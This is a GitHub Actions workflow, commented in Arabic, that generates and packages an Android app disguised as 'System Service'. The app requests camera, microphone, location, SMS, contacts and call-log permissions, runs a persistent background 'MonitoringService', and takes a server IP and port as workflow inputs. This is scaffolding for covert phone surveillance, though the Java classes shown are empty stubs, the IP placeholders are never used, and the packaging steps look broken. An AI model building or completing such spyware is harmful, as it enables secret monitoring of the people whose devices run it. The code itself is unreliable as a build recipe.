name: Build APK

on:
  workflow_dispatch:
    inputs:
      server_ip:
        description: 'Server IP Address'
        required: true
        default: '192.168.0.173'
      server_port:
        description: 'Server Port'
        required: true
        default: '8080'

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout code
      uses: actions/checkout@v3
      
    - name: Setup Android SDK
      uses: android-actions/setup-android@v3

    - name: Install Android components
      run: |
        sdkmanager "platform-tools" "platforms;android-30" "build-tools;30.0.3"
        
    - name: Build APK
      run: |
        # 🔥 التغيير هنا: android-app بدل app 🔥
        cd android-app
        
        # إنشاء ملف AndroidManifest.xml
        if [ ! -f AndroidManifest.xml ]; then
          echo '<?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.remote.monitoring">
              <uses-permission android:name="android.permission.INTERNET"/>
              <uses-permission android:name="android.permission.CAMERA"/>
              <uses-permission android:name="android.permission.RECORD_AUDIO"/>
              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
              <uses-permission android:name="android.permission.READ_SMS"/>
              <uses-permission android:name="android.permission.READ_CONTACTS"/>
              <uses-permission android:name="android.permission.READ_CALL_LOG"/>
              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
              <application android:label="System Service" android:icon="@drawable/ic_launcher">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN"/>
                          <category android:name="android.intent.category.LAUNCHER"/>
                      </intent-filter>
                  </activity>
                  <service android:name=".MonitoringService" android:exported="false"/>
              </application>
          </manifest>' > AndroidManifest.xml
        fi
        
        # إنشاء مجلد ومصدر جافا
        mkdir -p src/com/remote/monitoring
        
        # إنشاء MainActivity.java
        echo 'package com.remote.monitoring;
        import android.app.Activity;
        import android.os.Bundle;
        import android.widget.Toast;
        public class MainActivity extends Activity {
            @Override
            protected void onCreate(Bundle savedInstanceState) {
                super.onCreate(savedInstanceState);
                Toast.makeText(this, "Service started", Toast.LENGTH_LONG).show();
                finish();
            }
        }' > src/com/remote/monitoring/MainActivity.java
        
        # إنشاء MonitoringService.java
        echo 'package com.remote.monitoring;
        import android.app.Service;
        import android.content.Intent;
        import android.os.IBinder;
        public class MonitoringService extends Service {
            @Override
            public int onStartCommand(Intent intent, int flags, int startId) {
                return START_STICKY;
            }
            @Override
            public IBinder onBind(Intent intent) { return null; }
        }' > src/com/remote/monitoring/MonitoringService.java
        
        # تحديث عنوان IP
        find . -type f -name "*.java" -exec sed -i "s/YOUR_SERVER_IP/${{ github.event.inputs.server_ip }}/g" {} \;
        find . -type f -name "*.java" -exec sed -i "s/YOUR_SERVER_PORT/${{ github.event.inputs.server_port }}/g" {} \;
        
        # تجميع جافا
        mkdir -p bin
        javac -d bin src/com/remote/monitoring/*.java
        
        # إنشاء classes.dex
        $ANDROID_SDK_ROOT/build-tools/30.0.3/dx --dex --output=classes.dex bin
        
        # إنشاء مجلد للـ APK
        mkdir -p build/apk
        cd build/apk
        mkdir -p META-INF
        cp ../../AndroidManifest.xml .
        cp ../../classes.dex .
        mkdir -p res/drawable
        echo "<?xml version=\"1.0\" encoding=\"utf-8\"?><adaptive-icon xmlns:android=\"http://schemas.android.com/apk/res/android\"><background><shape android:shape=\"oval\"><solid android:color=\"#3F51B5\"/></shape></background></adaptive-icon>" > res/drawable/ic_launcher.xml
        
        # إنشاء ملف APK
        zip -r app.apk AndroidManifest.xml classes.dex res META-INF
        mv app.apk ../../monitoring-app.apk
        
    - name: Upload APK
      uses: actions/upload-artifact@v4
      with:
        name: monitoring-app
        path: monitoring-app.apk
